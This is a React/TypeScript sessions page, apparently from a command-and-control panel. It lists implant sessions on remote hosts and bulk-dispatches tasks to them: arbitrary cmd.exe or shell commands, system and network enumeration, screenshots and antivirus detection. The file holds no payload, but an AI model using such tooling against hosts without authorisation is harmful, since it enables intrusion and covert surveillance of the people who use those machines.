import { useState, useEffect, useCallback, useRef, useMemo } from 'react'
import { useParams } from 'react-router-dom'
import { Search, RefreshCw, X, Send } from 'lucide-react'
import { SessionTable, sessionStatusBadge } from '../components/SessionTable'
import { SessionDetail } from '../components/SessionDetail'
import { Toolbar } from '../components/ui'
import { sessionApi, taskApi } from '../api'
import { useUIStore } from '../stores/uiStore'
import type { Session, BulkTaskResponse } from '../types'
import type { WSEvent } from '../hooks/useWebSocket'
import './Sessions.css'

/**
 * 批量下发可选的任务类型（v1.4.1）。
 *
 * 与「单会话下发」的任务类型命名保持一致（command / shell / sysinfo / netstat /
 * service_list / process_list / screenshot / av_detect，见 templates 页与 interact 接口），
 * 服务端另有白名单 + 破坏性动作拒绝兜底：这里列不出来不代表服务端一定放行，
 * 反过来也成立 —— 选了白名单外的类型会逐项返回 task_type_not_allowed。
 */
interface BulkTaskTypeOption {
  value: string
  label: string
  /** 是否必须填命令（侦察内置类型由植入端自己执行，不需要命令） */
  needsCommand: boolean
  hint: string
}

const BULK_TASK_TYPES: BulkTaskTypeOption[] = [
  { value: 'command', label: '命令执行 (command)', needsCommand: true, hint: 'cmd.exe /C <命令>，返回 stdout 与退出码' },
  { value: 'shell', label: 'Shell 命令 (shell)', needsCommand: true, hint: '按系统默认 shell 执行（Windows: cmd.exe /C）' },
  { value: 'sysinfo', label: '系统信息 (sysinfo)', needsCommand: false, hint: '植入端内置 systeminfo 采集' },
  { value: 'netstat', label: '网络连接 (netstat)', needsCommand: false, hint: '植入端内置 netstat -ano' },
  { value: 'service_list', label: '服务列表 (service_list)', needsCommand: false, hint: '植入端内置服务枚举' },
  { value: 'process_list', label: '进程列表 (process_list)', needsCommand: false, hint: '只读进程枚举' },
  { value: 'screenshot', label: '屏幕截图 (screenshot)', needsCommand: false, hint: '整屏截图（结果到任务详情查看）' },
  { value: 'av_detect', label: '杀软识别 (av_detect)', needsCommand: false, hint: '按服务端指纹库识别安全软件' },
]

/** 从 axios 错误里取服务端返回的 error 文本（后端错误体统一为 {"error": "..."}）。 */
function errorMessageOf(e: unknown): string {
  const err = e as { response?: { data?: { error?: string } }; message?: string }
  return err?.response?.data?.error || err?.message || '批量下发失败'
}

/**
 * 批量下发弹窗：选类型 → 填命令/参数 → 提交 → **逐行**展示每台的成功/失败。
 *
 * 状态全部留在弹窗内部：关闭即卸载，下次打开是干净的；父组件只负责在关闭时清空选中。
 * 服务端一次请求返回所有目标的结果（逐项独立，一个失败不影响其它项），因此这里
 * 不需要前端循环调用，也不会出现"成功 N 失败 M"之外看不到细节的情况。
 */
function BulkTaskModal({
  sessionIds,
  sessions,
  onClose,
}: {
  sessionIds: string[]
  sessions: Session[]
  onClose: () => void
}) {
  const [taskType, setTaskType] = useState('command')
  const [command, setCommand] = useState('')
  const [argsText, setArgsText] = useState('')
  const [timeoutSec, setTimeoutSec] = useState(60)
  const [submitting, setSubmitting] = useState(false)
  const [result, setResult] = useState<BulkTaskResponse | null>(null)
  const [error, setError] = useState('')

  const option = BULK_TASK_TYPES.find((t) => t.value === taskType) || BULK_TASK_TYPES[0]
  // 提交中禁用按钮；command/shell 必须给命令（其余类型由植入端内置逻辑执行）。
  const canSubmit = !submitting && sessionIds.length > 0 && (!option.needsCommand || command.trim() !== '')

  // 结果行显示"主机名（会话 id）"，找不到会话（已下线/已删除）时退回 id。
  const labelOf = (id: string) => {
    const s = sessions.find((x) => x.id === id)
    if (!s) return id
    return s.hostname ? `${s.hostname}（${id}）` : id
  }

  const submit = async () => {
    if (!canSubmit) return
    setSubmitting(true)
    setError('')
    setResult(null)
    try {
      const args = argsText.trim() ? argsText.trim().split(/\s+/) : undefined
      const resp = await taskApi.bulk({
        session_ids: sessionIds,
        task_type: taskType,
        command: option.needsCommand ? command.trim() : '',
        args,
        // 与服务端 avops.MaxTimeoutSec 对齐（1~600 秒），避免手滑输入把任务挂死。
        timeout: Number.isFinite(timeoutSec) ? Math.max(1, Math.min(600, Math.trunc(timeoutSec))) : 60,
      })
      setResult(resp.data)
    } catch (e) {
      setError(errorMessageOf(e))
    } finally {
      setSubmitting(false)
    }
  }

  return (
    <div
      className="modal-overlay"
      onClick={(e) => {
        if (e.target === e.currentTarget && !submitting) onClose()
      }}
    >
      <div className="modal bulk-modal" role="dialog" aria-label="批量下发任务">
        <div className="modal-header">
          <h3>批量下发（{sessionIds.length} 台）</h3>
          <button className="close-btn" onClick={onClose} disabled={submitting} title="关闭">×</button>
        </div>
        <div className="modal-body">
          <div className="bulk-form">
            <div className="ui-field">
              <label className="ui-field-label">任务类型</label>
              <select
                className="ui-select"
                value={taskType}
                onChange={(e) => {
                  setTaskType(e.target.value)
                  setResult(null)
                  setError('')
                }}
                disabled={submitting}
              >
                {BULK_TASK_TYPES.map((t) => (
                  <option key={t.value} value={t.value}>{t.label}</option>
                ))}
              </select>
              <div className="ui-field-hint">{option.hint}</div>
            </div>

            {option.needsCommand && (
              <div className="ui-field">
                <label className="ui-field-label">命令<span className="ui-req">*</span></label>
                <input
                  className="ui-input ui-input--mono"
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  placeholder="如 whoami / systeminfo / net user"
                  disabled={submitting}
                  autoFocus
                />
              </div>
            )}

            <div className="bulk-form-row">
              <div className="ui-field">
                <label className="ui-field-label">参数（可选，空格分隔）</label>
                <input
                  className="ui-input ui-input--mono"
                  value={argsText}
                  onChange={(e) => setArgsText(e.target.value)}
                  placeholder="对应任务 args；多数类型无需填写"
                  disabled={submitting}
                />
              </div>
              <div className="ui-field">
                <label className="ui-field-label">超时（秒）</label>
                <input
                  className="ui-input"
                  type="number"
                  min={1}
                  max={600}
                  value={timeoutSec}
                  onChange={(e) => setTimeoutSec(Number(e.target.value))}
                  disabled={submitting}
                />
              </div>
            </div>

            <div className="ui-field-hint">目标：{sessionIds.map(labelOf).join('、')}</div>
          </div>

          {error && (
            <div className="ui-callout ui-callout--danger bulk-error">
              <div>
                <div className="ui-callout-title">请求失败</div>
                {error}
              </div>
            </div>
          )}

          {result && (
            <div className="bulk-result">
              <div className="bulk-result-head">
                <span>共 {result.total} 台</span>
                <span className="bulk-ok">成功 {result.succeeded}</span>
                <span className="bulk-err">失败 {result.failed}</span>
              </div>
              {/* 逐行展示：会话 / 成功-任务ID / 失败-服务端 error 原文 */}
              <div className="bulk-result-list">
                {result.items.map((it, i) => (
                  <div className="bulk-result-row" key={`${it.session_id}-${i}`}>
                    <span className="bulk-sid" title={it.session_id}>{labelOf(it.session_id)}</span>
                    {it.ok ? (
                      <span className="bulk-ok">成功 · 任务 #{it.task_id}</span>
                    ) : (
                      <span className="bulk-err">失败 · {it.error || '未知错误'}</span>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
        <div className="modal-footer">
          <button className="btn-small" onClick={onClose} disabled={submitting}>关闭</button>
          <button className="btn-small btn-primary" onClick={submit} disabled={!canSubmit}>
            {submitting ? '下发中...' : result ? '再次下发' : `下发到 ${sessionIds.length} 台`}
          </button>
        </div>
      </div>
    </div>
  )
}

export function Sessions() {
  const { id } = useParams<{ id: string }>()
  const [sessions, setSessions] = useState<Session[]>([])
  // 选中会话 + 搜索词提升到全局 store：切换页面后返回时保留状态
  const selectedSession = useUIStore((s) => s.selectedSession)
  const setSelectedSession = useUIStore((s) => s.setSelectedSession)
  const search = useUIStore((s) => s.sessionSearch)
  const setSearch = useUIStore((s) => s.setSessionSearch)
  // 状态筛选是纯展示态的客户端过滤，留在本页局部 state（不进 store，不改数据流）
  const [status, setStatus] = useState<string>('all')
  const [loading, setLoading] = useState(false)
  const wsConnectedRef = useRef(false)
  // 多选（批量下发）：只存 id，弹窗打开时用当前列表补主机名
  const [selectedIds, setSelectedIds] = useState<string[]>([])
  const [bulkOpen, setBulkOpen] = useState(false)
  // ref 镜像选中会话：fetchSessions 读取最新值但不重建回调（避免 WS 重连抖动）
  const selectedRef = useRef<Session | null>(null)
  useEffect(() => { selectedRef.current = selectedSession }, [selectedSession])

  const fetchSessions = useCallback(async () => {
    setLoading(true)
    try {
      const response = await sessionApi.list()
      const data = response?.data?.sessions || []
      const list = Array.isArray(data) ? data : []
      setSessions(list)
      // 会话被删除/下线清理后，选中集合不能留下悬空 id（否则批量下发会白白失败）
      setSelectedIds((prev) => {
        if (prev.length === 0) return prev
        const alive = new Set(list.map((s) => s.id))
        const next = prev.filter((sid) => alive.has(sid))
        return next.length === prev.length ? prev : next
      })
      // 同步右侧详情面板数据（心跳/最后在线等字段）
      const cur = selectedRef.current
      if (cur) {
        const updated = list.find((s) => s.id === cur.id)
        if (updated) {
          setSelectedSession({ ...cur, ...updated })
        }
      }
    } catch (error) {
      console.error('Failed to fetch sessions:', error)
    } finally {
      setLoading(false)
    }
  }, [])

  // WebSocket connection for real-time session updates
  useEffect(() => {
    const token = localStorage.getItem('toshell-token')
    const wsUrl = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api/v1/ws/events?token=${token}`
    let reconnectTimer: ReturnType<typeof setTimeout>
    let reconnectAttempts = 0
    const maxReconnectAttempts = 5
    let ws: WebSocket | null = null
    // 僵尸重连防护：组件卸载后禁止任何重连/回调（防旧 WS 复活 + setState）
    let disposed = false

    const connect = () => {
      if (disposed) return
      ws = new WebSocket(wsUrl)

      ws.onopen = () => {
        if (disposed) { ws?.close(); return }
        wsConnectedRef.current = true
        reconnectAttempts = 0
      }

      ws.onmessage = (e) => {
        if (disposed) return
        try {
          const event = JSON.parse(e.data) as WSEvent
          switch (event.type) {
            case 'session_online': {
              const payload = event.payload as { id: string; hostname: string; username: string; os: string; arch: string; status: string }
              setSessions(prev => {
                const exists = prev.find(s => s.id === payload.id)
                if (exists) {
                  return prev.map(s => s.id === payload.id ? { ...s, status: 'active', last_seen: new Date().toISOString() } : s)
                }
                // New session - fetch full list for complete data
                fetchSessions()
                return prev
              })
              break
            }
            case 'session_offline': {
              const payload = event.payload as { id: string }
              setSessions(prev =>
                prev.map(s => s.id === payload.id ? { ...s, status: 'dead' } : s)
              )
              // Clear selection if selected session went offline
              if (selectedRef.current?.id === payload.id) {
                setSelectedSession(null)
              }
              break
            }
          }
        } catch {
          // ignore parse errors
        }
      }

      ws.onclose = () => {
        if (disposed) return
        wsConnectedRef.current = false
        if (reconnectAttempts < maxReconnectAttempts) {
          reconnectAttempts++
          reconnectTimer = setTimeout(connect, 3000)
        }
      }
    }

    connect()

    return () => {
      disposed = true
      wsConnectedRef.current = false
      clearTimeout(reconnectTimer)
      ws?.close()
    }
  }, [fetchSessions])

  // 定期刷新会话列表（始终执行，用于刷新心跳 last_seen / 在线状态；
  // 后端心跳只更新 LastSeen 不推送事件，仅靠 WebSocket 无法刷新心跳列）
  useEffect(() => {
    fetchSessions()
    const interval = setInterval(fetchSessions, 10000)
    return () => clearInterval(interval)
  }, [fetchSessions])

  // URL 带会话 ID（如从驾驶舱跳转 /sessions/:id）：列表就绪后自动选中该会话
  useEffect(() => {
    if (!id) return
    if (sessions.length === 0) return
    const target = sessions.find((s) => s.id === id)
    if (target) {
      setSelectedSession({ ...selectedRef.current, ...target })
    }
  }, [id, sessions, setSelectedSession])

  // 状态筛选项来自当前数据（避免写死后端新增状态无法筛选）；始终保留当前选中项
  const statusOptions = useMemo(() => {
    const set = new Set<string>()
    for (const s of sessions) if (s.status) set.add(s.status)
    const list = Array.from(set).sort()
    if (status !== 'all' && !list.includes(status)) list.unshift(status)
    return list
  }, [sessions, status])

  const clearFilters = useCallback(() => {
    setSearch('')
    setStatus('all')
  }, [setSearch])

  // 勾选/取消单台；表头全选/反选只作用于当前可见（搜索+状态过滤后）的会话
  const toggleSelect = useCallback((sid: string) => {
    setSelectedIds((prev) => (prev.includes(sid) ? prev.filter((x) => x !== sid) : [...prev, sid]))
  }, [])
  const toggleSelectAll = useCallback((ids: string[], select: boolean) => {
    setSelectedIds((prev) => {
      if (select) {
        const set = new Set(prev)
        for (const sid of ids) set.add(sid)
        return Array.from(set)
      }
      const drop = new Set(ids)
      return prev.filter((sid) => !drop.has(sid))
    })
  }, [])

  return (
    <div className="sessions-page">
      {/* 工具条：搜索 + 状态筛选 + 刷新（筛选/搜索都是客户端过滤） */}
      <Toolbar>
        <div className="search-box">
          <Search size={16} className="search-icon" />
          <input
            type="text"
            placeholder="搜索主机名 / 用户名 / IP / 进程名 / 会话 ID..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            aria-label="搜索会话"
          />
          {search && (
            <button type="button" className="search-clear" title="清除搜索" onClick={() => setSearch('')}>
              <X size={14} />
            </button>
          )}
        </div>
        <select
          className="ui-select sessions-status-filter"
          value={status}
          onChange={(e) => setStatus(e.target.value)}
          aria-label="按状态筛选"
          title="按状态筛选"
        >
          <option value="all">全部状态</option>
          {statusOptions.map((st) => (
            <option key={st} value={st}>{sessionStatusBadge(st).label}</option>
          ))}
        </select>
        <span className="sessions-total">共 {sessions.length} 台</span>
        {selectedIds.length > 0 && (
          <>
            <span className="sessions-selected">已选 {selectedIds.length} 台</span>
            <button
              type="button"
              className="bulk-dispatch-btn"
              onClick={() => setBulkOpen(true)}
              title="把同一条任务一次下发给选中的会话"
            >
              <Send size={15} />
              批量下发
            </button>
            <button
              type="button"
              className="bulk-clear-btn"
              onClick={() => setSelectedIds([])}
              title="清空选中"
            >
              清除选择
            </button>
          </>
        )}
        <button className="refresh-btn" onClick={fetchSessions} disabled={loading}>
          <RefreshCw size={15} className={loading ? 'spin' : ''} />
          刷新
        </button>
      </Toolbar>

      {/* 表格 + 详情面板（并排布局） */}
      <div className="sessions-container">
        <SessionTable
          sessions={sessions}
          selectedSession={selectedSession}
          onSelectSession={setSelectedSession}
          onSessionsChange={setSessions}
          embedded
          searchFilter={search}
          statusFilter={status}
          onClearFilters={clearFilters}
          selectable
          selectedIds={selectedIds}
          onToggleSelect={toggleSelect}
          onToggleSelectAll={toggleSelectAll}
        />
        {selectedSession && (
          <SessionDetail
            session={selectedSession}
            onClose={() => setSelectedSession(null)}
          />
        )}
      </div>

      {/* 批量下发弹窗：关闭（含点遮罩/×/关闭按钮）时清空选中 */}
      {bulkOpen && (
        <BulkTaskModal
          sessionIds={selectedIds}
          sessions={sessions}
          onClose={() => {
            setBulkOpen(false)
            setSelectedIds([])
          }}
        />
      )}
    </div>
  )
}
